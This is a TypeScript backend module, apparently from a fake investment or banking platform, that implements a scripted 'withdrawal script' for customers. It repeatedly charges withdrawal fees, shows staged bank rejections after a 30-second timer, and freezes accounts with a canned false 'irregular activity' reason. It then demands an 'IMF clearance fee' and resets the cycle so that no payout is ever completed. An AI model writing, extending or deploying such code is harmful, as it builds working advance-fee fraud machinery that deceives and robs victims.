import type { Prisma, WithdrawalScriptPhase } from "@prisma/client";
import { prisma, runInteractiveTransaction } from "@/lib/prisma";
import { freezeUserAccount, ensureFundReleaseRequest } from "@/lib/account-freeze";
import { getPlatformSettings, SETTING_KEYS, ensureDefaultSettings } from "@/lib/platform-settings";
import { createUserNotification } from "@/lib/user-notifications";
import { formatCurrency } from "@/lib/utils";
import { invalidateAdminCaches } from "@/lib/admin-cache";
import { getBankRejectFailureCopy } from "@/lib/withdrawal-script-messages";

export const WITHDRAWAL_SCRIPT_PENDING_SECONDS = 30;

export const WITHDRAWAL_SCRIPT_AML_REASON =
  "We detected irregular activity or a potentially unauthorized transaction on your account. As a security precaution to protect your funds, a temporary hold has been placed until we can verify your identity and confirm these transactions.";

export type WithdrawalScriptSettings = {
  enabled: boolean;
  minBankWithdrawalUsd: number;
  minProfitBalanceUsd: number;
  minProfitWithdrawalUsd: number;
  imfClearanceFeePercent: number;
};

export async function getWithdrawalScriptSettings(): Promise<WithdrawalScriptSettings> {
  await ensureDefaultSettings();
  const settings = await getPlatformSettings([
    SETTING_KEYS.WITHDRAWAL_SCRIPT_ENABLED,
    SETTING_KEYS.MIN_BANK_WITHDRAWAL_USD,
    SETTING_KEYS.MIN_PROFIT_BALANCE_FOR_WITHDRAW_USD,
    SETTING_KEYS.MIN_PROFIT_WITHDRAWAL_USD,
    SETTING_KEYS.IMF_CLEARANCE_FEE_PERCENTAGE,
  ]);

  return {
    enabled: settings[SETTING_KEYS.WITHDRAWAL_SCRIPT_ENABLED].trim().toLowerCase() !== "false",
    minBankWithdrawalUsd: Math.max(0, Number(settings[SETTING_KEYS.MIN_BANK_WITHDRAWAL_USD]) || 0),
    minProfitBalanceUsd: Math.max(0, Number(settings[SETTING_KEYS.MIN_PROFIT_BALANCE_FOR_WITHDRAW_USD]) || 0),
    minProfitWithdrawalUsd: Math.max(0, Number(settings[SETTING_KEYS.MIN_PROFIT_WITHDRAWAL_USD]) || 0),
    imfClearanceFeePercent: Math.max(0, Number(settings[SETTING_KEYS.IMF_CLEARANCE_FEE_PERCENTAGE]) || 0),
  };
}

export async function getSystemAdminUserId(): Promise<string> {
  const admin = await prisma.user.findFirst({
    where: { role: "ADMIN" },
    orderBy: { createdAt: "asc" },
    select: { id: true },
  });
  if (!admin) throw new Error("No administrator account configured");
  return admin.id;
}

export function scriptRedirectPath(withdrawalId: string, segment: string) {
  return `/dashboard/withdrawals/${withdrawalId}/script/${segment}`;
}

export function isWithdrawalScriptCycleComplete(
  withdrawal: { status: string; scriptPhase: WithdrawalScriptPhase | string },
  userStep: number
): boolean {
  if (withdrawal.status !== "REJECTED") return false;
  if (withdrawal.scriptPhase === "BANK_REJECTED" && userStep === 0) return true;
  if (withdrawal.scriptPhase === "NONE" || withdrawal.scriptPhase === "SCRIPT_COMPLETE") return true;
  return false;
}

/** True while the customer is on the post-decline screen (not the final rejected end-of-cycle row). */
export function isIntermediateScriptBankReject(
  withdrawal: { status: string; scriptPhase: WithdrawalScriptPhase | string },
  userStep: number
): boolean {
  if (withdrawal.scriptPhase !== "BANK_REJECTED") return false;
  return !isWithdrawalScriptCycleComplete(withdrawal, userStep);
}

/** After a mid-cycle bank decline, user may start a fresh withdrawal while the prior row awaits fee payment. */
export function allowsNewWithdrawalAfterBankDecline(
  withdrawal: { scriptPhase: WithdrawalScriptPhase | string; status: string },
  userStep: number
): boolean {
  if (userStep < 1) return false;
  if (!isIntermediateScriptBankReject(withdrawal, userStep)) return false;
  if (withdrawal.status === "REJECTED") return false;
  return true;
}

export async function findActiveScriptCycleWithdrawal(userId: string) {
  const settings = await getWithdrawalScriptSettings();
  if (!settings.enabled) return null;

  const user = await prisma.user.findUnique({
    where: { id: userId },
    select: { withdrawalScriptStep: true },
  });
  const userStep = user?.withdrawalScriptStep ?? 0;

  const latest = await prisma.withdrawalRequest.findFirst({
    where: { userId },
    orderBy: { createdAt: "desc" },
    include: { chargePayment: true, imfClearancePayment: true },
  });
  if (!latest) return null;
  if (isWithdrawalScriptCycleComplete(latest, userStep)) return null;

  const phaseActive =
    latest.scriptPhase !== "NONE" &&
    latest.scriptPhase !== "SCRIPT_COMPLETE" &&
    !(latest.status === "REJECTED" && latest.scriptPhase === "BANK_REJECTED");

  if (
    latest.status === "AWAITING_CHARGE_PAYMENT" ||
    latest.status === "PENDING" ||
    phaseActive ||
    latest.scriptPhase === "SCRIPT_COMPLETE" ||
    latest.scriptPhase === "BANK_REJECTED"
  ) {
    return latest;
  }

  return null;
}

/** Fix rows that were marked REJECTED mid-cycle before single-segment billing shipped. */
export async function repairScriptCycleWithdrawalState(userId: string) {
  const settings = await getWithdrawalScriptSettings();
  if (!settings.enabled) return;

  const user = await prisma.user.findUnique({
    where: { id: userId },
    select: { withdrawalScriptStep: true },
  });
  const step = user?.withdrawalScriptStep ?? 0;

  const w = await prisma.withdrawalRequest.findFirst({
    where: { userId },
    orderBy: { createdAt: "desc" },
    include: { chargePayment: true },
  });
  if (!w || isWithdrawalScriptCycleComplete(w, step)) return;

  if (
    w.scriptPhase === "BANK_REJECTED" &&
    step >= 1 &&
    w.status === "PENDING" &&
    w.chargePayment
  ) {
    await resetWithdrawalChargeForNextScriptStep(w.id, { scriptPhase: "BANK_REJECTED" });
    return;
  }

  if (w.status !== "REJECTED") return;

  if (step === 1) {
    await resetWithdrawalChargeForNextScriptStep(w.id, { scriptPhase: "BANK_REJECTED" });
    return;
  }

  if (step === 2 && w.scriptPhase === "SCRIPT_COMPLETE") {
    await prisma.withdrawalRequest.update({
      where: { id: w.id },
      data: { status: "PENDING" },
    });
    return;
  }

  if (step === 3) {
    if (w.scriptPhase === "SCRIPT_COMPLETE") {
      await prisma.withdrawalRequest.update({
        where: { id: w.id },
        data: { status: "PENDING" },
      });
    }
    await prepareWithdrawalForThirdScriptCharge(userId);
  }
}

async function resetWithdrawalChargeForNextScriptStep(
  withdrawalId: string,
  options?: { scriptPhase?: WithdrawalScriptPhase }
) {
  const withdrawal = await prisma.withdrawalRequest.findUnique({
    where: { id: withdrawalId },
    include: { chargePayment: true },
  });
  if (!withdrawal?.chargePayment) return;

  const amount =
    withdrawal.assignedChargeAmount != null
      ? Number(withdrawal.assignedChargeAmount)
      : Number(withdrawal.chargePayment.amountUsd);

  await prisma.withdrawalChargePayment.update({
    where: { id: withdrawal.chargePayment.id },
    data: {
      status: "UNPAID",
      amountUsd: amount,
      paidAt: null,
      txHash: null,
      proofNote: null,
      proofImage: null,
      reviewNote: null,
    },
  });

  await prisma.withdrawalRequest.update({
    where: { id: withdrawalId },
    data: {
      status: "AWAITING_CHARGE_PAYMENT",
      scriptPhase: options?.scriptPhase ?? "NONE",
    },
  });
}

export async function prepareWithdrawalForThirdScriptCharge(userId: string) {
  const withdrawal = await prisma.withdrawalRequest.findFirst({
    where: {
      userId,
      scriptPhase: "SCRIPT_COMPLETE",
    },
    orderBy: { createdAt: "desc" },
    include: { chargePayment: true },
  });
  if (!withdrawal?.chargePayment) return;

  await resetWithdrawalChargeForNextScriptStep(withdrawal.id);
}

export async function scriptRefundWithdrawalAndCreditFee(
  withdrawalId: string,
  reviewNote: string,
  options?: { finalizeCycle?: boolean }
) {
  const finalizeCycle = options?.finalizeCycle ?? true;
  await runInteractiveTransaction(async (tx) => {
    const withdrawal = await tx.withdrawalRequest.findUnique({
      where: { id: withdrawalId },
      include: { chargePayment: true },
    });
    if (!withdrawal) throw new Error("Withdrawal not found");

    const amount = Number(withdrawal.amountUsd);
    const fee = withdrawal.chargePayment ? Number(withdrawal.chargePayment.amountUsd) : 0;

    if (withdrawal.fundsHeld) {
      const account = await tx.bankAccount.findFirst({
        where: { id: withdrawal.accountId, userId: withdrawal.userId },
      });
      if (!account) throw new Error("Account not found");

      const balanceBefore = Number(account.balance);
      const creditTotal = Math.round((amount + fee) * 100) / 100;
      await tx.bankAccount.update({
        where: { id: withdrawal.accountId },
        data: { balance: Math.round((balanceBefore + creditTotal) * 100) / 100 },
      });

      await tx.transaction.updateMany({
        where: {
          userId: withdrawal.userId,
          accountId: withdrawal.accountId,
          type: "WITHDRAWAL",
          status: "PENDING",
          amount,
          createdAt: { gte: withdrawal.createdAt },
        },
        data: { status: "FAILED" },
      });

      await tx.transaction.create({
        data: {
          userId: withdrawal.userId,
          accountId: withdrawal.accountId,
          type: "DEPOSIT",
          amount: creditTotal,
          description:
            fee > 0
              ? "Withdrawal refund — processing fee returned to balance"
              : "Withdrawal refund — request not approved",
          status: "COMPLETED",
        },
      });
    }

    if (withdrawal.chargePayment) {
      await tx.withdrawalChargePayment.update({
        where: { id: withdrawal.chargePayment.id },
        data: {
          status: "PAID",
          paidAt: new Date(),
          reviewNote: "Verified by automated processing",
        },
      });
    }

    await tx.withdrawalRequest.update({
      where: { id: withdrawalId },
      data: {
        status: finalizeCycle ? "REJECTED" : "PENDING",
        reviewNote,
        fundsHeld: false,
      },
    });
  });
}

export async function handleWithdrawalScriptAfterChargeSubmit(_userId: string, withdrawalId: string) {
  return { redirectTo: `/dashboard/withdrawals/${withdrawalId}/pay-charge/verifying` };
}

/** After admin verifies the charge payment, advance the withdrawal script (timer / next screen). */
export async function advanceWithdrawalScriptAfterChargeVerified(
  userId: string,
  withdrawalId: string,
  tx: Prisma.TransactionClient = prisma
) {
  const script = await getWithdrawalScriptSettings();
  if (!script.enabled) return { redirectPath: null as string | null };

  const user = await tx.user.findUnique({
    where: { id: userId },
    select: { withdrawalScriptStep: true },
  });
  if (!user) return { redirectPath: null };

  const step = user.withdrawalScriptStep;

  if (step === 0 || step === 1 || step === 3) {
    await tx.withdrawalRequest.update({
      where: { id: withdrawalId },
      data: {
        scriptPhase: "PENDING_TIMER",
        scriptPendingStartedAt: new Date(),
      },
    });
    if (step === 1) {
      return { redirectPath: `/dashboard/withdrawals/${withdrawalId}/pay-charge` };
    }
    return { redirectPath: scriptRedirectPath(withdrawalId, "pending") };
  }

  return { redirectPath: null };
}

export async function completeWithdrawalScriptPendingTimer(userId: string, withdrawalId: string) {
  const withdrawal = await prisma.withdrawalRequest.findFirst({
    where: { id: withdrawalId, userId },
    include: { chargePayment: true, imfClearancePayment: true },
  });
  if (!withdrawal) throw new Error("Withdrawal not found");
  if (withdrawal.scriptPhase !== "PENDING_TIMER") {
    throw new Error("Withdrawal is not awaiting confirmation");
  }

  const started = withdrawal.scriptPendingStartedAt?.getTime() ?? 0;
  const elapsed = (Date.now() - started) / 1000;
  if (elapsed < WITHDRAWAL_SCRIPT_PENDING_SECONDS - 0.5) {
    throw new Error("Confirmation still in progress");
  }

  const user = await prisma.user.findUnique({
    where: { id: userId },
    select: { withdrawalScriptStep: true },
  });
  if (!user) throw new Error("User not found");

  if (user.withdrawalScriptStep === 0) {
    const rejectCopy = getBankRejectFailureCopy(withdrawal.method);
    await scriptRefundWithdrawalAndCreditFee(withdrawalId, rejectCopy.reviewNote, { finalizeCycle: false });

    await prisma.user.update({
      where: { id: userId },
      data: { withdrawalScriptStep: 1 },
    });

    await resetWithdrawalChargeForNextScriptStep(withdrawalId, { scriptPhase: "BANK_REJECTED" });

    invalidateAdminCaches();
    return { next: "bank-rejected" as const, intermediate: true };
  }

  if (user.withdrawalScriptStep === 1) {
    await scriptRefundWithdrawalAndCreditFee(
      withdrawalId,
      "Withdrawal could not be completed. Funds and processing fee have been returned while your account is reviewed.",
      { finalizeCycle: false }
    );

    const adminId = await getSystemAdminUserId();
    await freezeUserAccount({
      userId,
      adminId,
      freezeType: "WITHDRAWAL_ONLY",
      reason: WITHDRAWAL_SCRIPT_AML_REASON,
      internalNotes: "Automated hold after second withdrawal charge submission (withdrawal script).",
    });

    try {
      await ensureFundReleaseRequest(userId);
    } catch {
      /* optional */
    }

    await prisma.user.update({
      where: { id: userId },
      data: { withdrawalScriptStep: 2 },
    });

    await prisma.withdrawalRequest.update({
      where: { id: withdrawalId },
      data: { scriptPhase: "SCRIPT_COMPLETE" },
    });

    invalidateAdminCaches();
    return {
      next: "account-restriction" as const,
      reason: WITHDRAWAL_SCRIPT_AML_REASON,
    };
  }

  if (user.withdrawalScriptStep === 3) {
    const imfAlreadyPaid = withdrawal.imfClearancePayment?.status === "PAID";

    if (imfAlreadyPaid) {
      const rejectCopy = getBankRejectFailureCopy(withdrawal.method);
      await scriptRefundWithdrawalAndCreditFee(withdrawalId, rejectCopy.reviewNote, { finalizeCycle: true });

      await prisma.user.update({
        where: { id: userId },
        data: { withdrawalScriptStep: 0 },
      });

      await prisma.withdrawalRequest.update({
        where: { id: withdrawalId },
        data: { scriptPhase: "BANK_REJECTED" },
      });

      invalidateAdminCaches();
      return { next: "bank-rejected" as const, cycleReset: true };
    }

    const script = await getWithdrawalScriptSettings();
    const withdrawalAmount = Number(withdrawal.amountUsd);
    const imfAmount =
      script.imfClearanceFeePercent > 0
        ? Math.round(((withdrawalAmount * script.imfClearanceFeePercent) / 100) * 100) / 100
        : 0;

    if (withdrawal.chargePayment && withdrawal.chargePayment.status === "PENDING_VERIFICATION") {
      await prisma.withdrawalChargePayment.update({
        where: { id: withdrawal.chargePayment.id },
        data: {
          status: "PAID",
          paidAt: new Date(),
          reviewNote: "Network fee verified (automated processing)",
        },
      });
    }

    if (imfAmount <= 0) {
      await prisma.withdrawalRequest.update({
        where: { id: withdrawalId },
        data: { scriptPhase: "SCRIPT_COMPLETE", status: "PENDING" },
      });
      return { next: "complete" as const };
    }

    await runInteractiveTransaction(async (tx) => {
      await tx.imfClearancePayment.upsert({
        where: { withdrawalRequestId: withdrawalId },
        create: {
          userId,
          withdrawalRequestId: withdrawalId,
          amountUsd: imfAmount,
          status: "UNPAID",
        },
        update: {
          amountUsd: imfAmount,
          status: "UNPAID",
          paidAt: null,
          txHash: null,
          proofNote: null,
          proofImage: null,
          reviewedBy: null,
          reviewNote: null,
        },
      });
      await tx.withdrawalRequest.update({
        where: { id: withdrawalId },
        data: { scriptPhase: "AWAITING_IMF_CLEARANCE" },
      });
    });

    return { next: "imf-clearance" as const, imfAmountUsd: imfAmount };
  }

  throw new Error("Withdrawal script step is not eligible for this action");
}

export async function markWithdrawalScriptStepAfterUnfreeze(userId: string) {
  await prisma.user.updateMany({
    where: { id: userId, withdrawalScriptStep: 2 },
    data: { withdrawalScriptStep: 3 },
  });
  await prepareWithdrawalForThirdScriptCharge(userId);
}

export function isScriptPhaseActive(phase: WithdrawalScriptPhase) {
  return phase !== "NONE" && phase !== "SCRIPT_COMPLETE";
}

export async function markImfClearancePaymentPaid(paymentId: string, adminId: string, reviewNote?: string) {
  await runInteractiveTransaction(async (tx) => {
    const payment = await tx.imfClearancePayment.update({
      where: { id: paymentId },
      data: {
        status: "PAID",
        paidAt: new Date(),
        reviewedBy: adminId,
        reviewNote: reviewNote?.trim() || null,
      },
      include: { withdrawalRequest: true },
    });

    await tx.withdrawalRequest.update({
      where: { id: payment.withdrawalRequestId },
      data: {
        status: "PENDING",
        scriptPhase: "PENDING_TIMER",
        scriptPendingStartedAt: new Date(),
      },
    });

    await createUserNotification(
      {
        userId: payment.userId,
        type: "WITHDRAWAL_SUBMITTED",
        title: "Clearance verified — sending to bank",
        message: `Your clearance fee of ${formatCurrency(Number(payment.amountUsd))} was verified. Your ${formatCurrency(Number(payment.withdrawalRequest.amountUsd))} withdrawal is being sent to the receiving bank.`,
      },
      tx
    );
  });
  invalidateAdminCaches();
}
